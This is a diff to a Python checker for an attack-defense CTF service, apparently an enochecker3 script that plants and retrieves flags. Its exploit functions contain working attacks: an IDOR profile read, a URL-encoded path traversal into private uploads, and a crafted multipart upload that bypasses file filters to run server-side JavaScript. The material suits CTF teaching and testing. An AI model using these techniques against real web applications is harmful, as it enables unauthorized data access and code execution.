@@ -1,5 +1,5 @@
 from typing import Optional #type checking / optional parameters i.e. a function may or may not return a str
-from httpx import AsyncClient #client for http requests
+from httpx import AsyncClient, Request #client for http requests
 from enochecker3 import (
     ChainDB,
     Enochecker,
@@ -36,7 +36,14 @@ async def register(client: AsyncClient):
     assert_equals(registerResp.status_code, 302, "couldn't register a new user under /user/register")
     cookie = parseCookie(str(client.cookies))
 
-    return email, password, cookie
+    # scour the frontpage to retrieve our unique userId
+    profileResp = await client.get("/", cookies={"jwtToken": cookie}) 
+    html = BeautifulSoup(profileResp, "html.parser")
+    userClass = html.find('span', attrs={'class':'user'})
+    profileLink = userClass.find('a')
+    userId = profileLink['href'].split('/')[-1]
+
+    return email, password, cookie, userId
 
 
 async def login(email: str, password: str, client: AsyncClient):
@@ -58,19 +65,21 @@ async def login(email: str, password: str, client: AsyncClient):
 async def putflag_note(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
 
     # register so client has a cookie 
-    email, password, cookie = await register(client)
+    email, password, cookie, userId = await register(client)
     await db.set("userinfo", (email, password) )
     
     # deposit the flag as the users personal note
     uploadResp = await client.post("/user/editnote", json={"text": task.flag}, cookies={"jwtToken": cookie})
     assert_equals(uploadResp.status_code, 302, "couldn't store flag under /user/editnote")
 
+    return userId
+
 
 @checker.putflag(1)
 async def putflag_private(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    
     # register so client has a cookie 
-    email, password, cookie = await register(client)
+    email, password, cookie, userId = await register(client)
     await db.set("userinfo", (email, password) )
 
     # create a .txt file containing the flag and upload it to /files/private
@@ -80,12 +89,14 @@ async def putflag_private(task: PutflagCheckerTaskMessage, client: AsyncClient, 
     uploadResp = await client.post('/files/private', files={"privateFile": open('flag.txt', 'rb')}, cookies={"jwtToken": cookie})
     assert_equals(uploadResp.status_code, 302, "couln't store flag under /files/private")
 
+    return userId
+
 
 @checker.putflag(2)
 async def putflag_backup(task: PutflagCheckerTaskMessage, client: AsyncClient, db: ChainDB) -> None:
    
     # register so client has a cookie 
-    email, password, cookie = await register(client)
+    email, password, cookie, userId = await register(client)
     await db.set("userinfo", (email, password) )
 
     # create a .txt file containing the flag and upload it to /files/backup
@@ -94,6 +105,8 @@ async def putflag_backup(task: PutflagCheckerTaskMessage, client: AsyncClient, d
 
     uploadResp = await client.post('/files/backup', files={"backupFile": open('flag.txt', 'rb')}, cookies={"jwtToken": cookie})
     assert_equals(uploadResp.status_code, 302, "couln't store flag under /files/backup")
+
+    return userId
 
 
 @checker.getflag(0)
@@ -156,13 +169,13 @@ async def exploit_note(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, 
     # retrieve userId from attackinfo
     if(task.attack_info == ""):
         raise InternalErrorException("Attack info is empty")
-    userId = task.attack_info
+    victimUserId = task.attack_info
 
     # register so client has a cookie 
-    email, password, cookie = await register(client)
+    email, password, cookie, userId = await register(client)
 
     # exploit
-    flagResp = await client.get(f"/user/profile/{userId}?userId={userId}", cookies={"jwtToken": cookie})
+    flagResp = await client.get(f"/user/profile/{victimUserId}?userId={victimUserId}", cookies={"jwtToken": cookie})
     assert_equals(flagResp.status_code, 200, "couldn't load profile page with flag")
 
     # retrieve and return the flag
@@ -176,13 +189,13 @@ async def exploit_private(task: ExploitCheckerTaskMessage, searcher: FlagSearche
     # retrieve userId from attackinfo
     if(task.attack_info == ""):
         raise InternalErrorException("Attack info is empty")
-    userId = task.attack_info
+    victimUserId = task.attack_info
 
     # register so client has a cookie 
-    email, password, cookie = await register(client)
+    email, password, cookie, userId = await register(client)
 
     # exploit
-    flagResp = await client.get(f"/uploads/{base64.b64encode(userId.encode()).decode()}/public/../private/flag.txt", cookies={"jwtToken": cookie})
+    flagResp = await client.get(f"/uploads/{base64.b64encode(victimUserId.encode()).decode()}%2Fpublic%2F..%2Fprivate%2Fflag.txt", cookies={"jwtToken": cookie})
     assert_equals(flagResp.status_code, 200, "couldn't load flag from private directory")
 
     # retrieve and return the flag
@@ -199,17 +212,7 @@ async def exploit_backup(task: ExploitCheckerTaskMessage, searcher: FlagSearcher
     victimUserId = task.attack_info
 
     # register so client has a cookie 
-    email, password, cookie = await register(client)
-
-    # scour the frontpage to retrieve our unique userId
-    try:
-        profileResp = await client.get("/", cookies={"jwtToken": cookie}) 
-        html = BeautifulSoup(profileResp, "html.parser")
-        userClass = html.find('span', attrs={'class':'user'})
-        profileLink = userClass.find('a')
-        userId = profileLink['href'].split('/')[-1]
-    except:
-        raise MumbleException("something went wrong while parsing the userId")
+    email, password, cookie, userId = await register(client)
 
     # create a file containing js that will be executed on server side to reveal the users flag
     with open('getflag.jpg.js', 'w') as getFlag:
@@ -227,9 +230,30 @@ async def exploit_backup(task: ExploitCheckerTaskMessage, searcher: FlagSearcher
                             const result = readFlagFile();
                             result;""" )
     
+    # add the content-type header to the file
+    with open('getflag.jpg.js', 'rb') as file:
+        data = file.read()
+    payload = b"Content-Type: image/jpeg\r\n\r\n" + data
+    
+    # create a request for a file upload
+    request = Request("POST", f"http://localhost:{SERVICE_PORT}/files/upload", files={"profilePicture": payload}, cookies={"jwtToken": cookie})
+    
+    # copy the headers for our actual request 
+    headers = {}
+    for header, value in request.headers.items():
+        headers[header] = value
+    
+    # replace the original content-type of the request and the filename and also adjust the content-length header
+    betterRequest = request.read().replace(b'Content-Type: application/octet-stream\r\n\r\n', b'')
+    betterRequest = betterRequest.replace(b'filename="upload"', b'filename="getflag.jpg.js"')
+    
+    length = headers['content-length']
+    newLength = int(length) - 34
+    headers['content-length'] = str(newLength)
+
     # upload the file to our public upload directory, bypassing server side filters
-    uploadResp = await client.post('/files/upload', headers={'Content-Type': 'image/jpeg'}, data={"file": open('getflag.jpg.js', 'rb')}, cookies={"jwtToken": cookie})
-    assert_equals(uploadResp.status_code, 200, "couldn't upload exploit to /files/upload")
+    uploadResp = await client.post('/files/upload', headers=headers , content=betterRequest)
+    assert_equals(uploadResp.status_code, 302, "couldn't upload exploit to /files/upload")
 
     # the file gets evaluated on server side and we should get the flag in the response
     flagResp = await client.get(f"/uploads/{base64.b64encode(userId.encode()).decode()}/public/getflag.jpg.js", cookies={"jwtToken": cookie})
